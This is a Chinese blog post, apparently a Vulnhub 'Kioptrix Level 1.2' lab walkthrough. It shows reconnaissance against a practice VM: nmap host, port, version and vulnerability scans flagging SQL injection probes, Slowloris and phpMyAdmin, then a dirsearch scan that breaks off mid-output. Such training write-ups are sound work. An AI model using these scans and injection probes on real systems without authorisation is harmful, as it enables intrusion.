<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录生活和学习的点滴" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，分享技术、学习和生活的点滴记录" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/logo.png" data-next-head=""/><title data-next-head="">Vulnhub - Kioptrix Level 1 2</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1ac7c7cc7fa781bb.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1ac7c7cc7fa781bb.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14467d077592c8ff.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-168339e2b704c72b.js" defer=""></script><script src="/_next/static/7FsVPUxpbPTlAaq4wvju-/_buildManifest.js" defer=""></script><script src="/_next/static/7FsVPUxpbPTlAaq4wvju-/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3xl px-3 mt-5 md:mt-15"><h1 class="text-xl md:text-2xl font-bold text-red-700">Vulnhub - Kioptrix Level 1 2</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-04-02</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-04-02<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Vulnhub</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubKioptrix Level 1 2","contentHtml":"\u003ch1\u003eKioptrix: Level 1.2\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/kioptrix-level-12-3,24/\"\u003ehttps://www.vulnhub.com/entry/kioptrix-level-12-3,24/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用nmap扫描网段类存活主机\u003c/p\u003e\n\u003cp\u003e因为靶机是我最后添加的，所以靶机IP是\u003ccode\u003e169\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-29 13:16 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00031\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00029\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.169\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00052\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:D1:B8:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00021\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:EC:C5:\u003cspan class=\"hljs-title function_ invoke__\"\u003eA4\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.169\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-29 13:16 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.169\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0010\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:D1:B8:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p22,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.169\u003c/span\u003e     \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-29 13:19 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.169\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00044\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e4.7\u003c/span\u003ep1 Debian \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003eubuntu1.\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e ((Ubuntu) PHP/\u003cspan class=\"hljs-number\"\u003e5.2\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003eubuntu5.\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e with Suhosin-Patch)\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:D1:B8:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p22,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e CST\nStats: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:02:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e elapsed; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e hosts completed (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e up), \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e undergoing Script Scan\nNSE Timing: About \u003cspan class=\"hljs-number\"\u003e98.52\u003c/span\u003e% done; ETC: \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:02 remaining)\nStats: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:02:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e elapsed; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e hosts completed (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e up), \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e undergoing Script Scan\nNSE Timing: About \u003cspan class=\"hljs-number\"\u003e98.52\u003c/span\u003e% done; ETC: \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:02 remaining)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00027\u003c/span\u003es latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e\n| http-sql-injection: \n|   Possible sqli \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e queries:\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?system=Admin\u0026#x26;page=loginSubmit%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?system=Admin\u0026#x26;page=loginSubmit%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n|_    http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php?page=index%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e%20OR%20sqlspider\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-\u003cspan class=\"hljs-number\"\u003e2007\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e6750\u003c/span\u003e\n|       Slowloris tries to keep many connections to the target web server \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e hold\n|       them \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e long \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e possible.  It accomplishes this by opening connections to\n|       the target web server \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e sending a partial request. By doing so, it starves\n|       the http serve\u003cspan class=\"hljs-string\"\u003er's resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_      http://ha.ckers.org/slowloris/\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-trace: TRACE is enabled\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.169\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.75.169:80/gallery/\n|     Form id: \n|     Form action: login.php\n|     \n|     Path: http://192.168.75.169:80/index.php?system=Admin\n|     Form id: contactform\n|     Form action: index.php?system=Admin\u0026#x26;page=loginSubmit\n|     \n|     Path: http://192.168.75.169:80/gallery/gadmin/\n|     Form id: username\n|     Form action: index.php?task=signin\n|     \n|     Path: http://192.168.75.169:80/gallery/index.php\n|     Form id: \n|     Form action: login.php\n|     \n|     Path: http://192.168.75.169:80/index.php?system=Blog\u0026#x26;post=1281005380\n|     Form id: commentform\n|     Form action: \n|     \n|     Path: http://192.168.75.169:80/index.php?system=Admin\u0026#x26;page=loginSubmit\n|     Form id: contactform\n|_    Form action: index.php?system=Admin\u0026#x26;page=loginSubmit\n|_http-dombased-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e DOM based XSS.\n| http-enum: \n|   /phpmyadmin/: phpMyAdmin\n|   /cache/: Potentially interesting folder\n|   /core/: Potentially interesting folder\n|   /icons/: Potentially interesting folder w/ directory listing\n|   /modules/: Potentially interesting directory w/ listing on \u003cspan class=\"hljs-string\"\u003e'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'\u003c/span\u003e\n|_  /style/: Potentially interesting folder\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\nMAC Address: 00:0C:29:D1:B8:48 (VMware)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eWEB渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubKioptrix%20Level%201%202/image58.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e\n//\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:06] Starting:                                                                                                                                                                                              \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  355B  - /cache  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e/cache/          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  354B  - /core  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e/core/            \n[\u003cspan 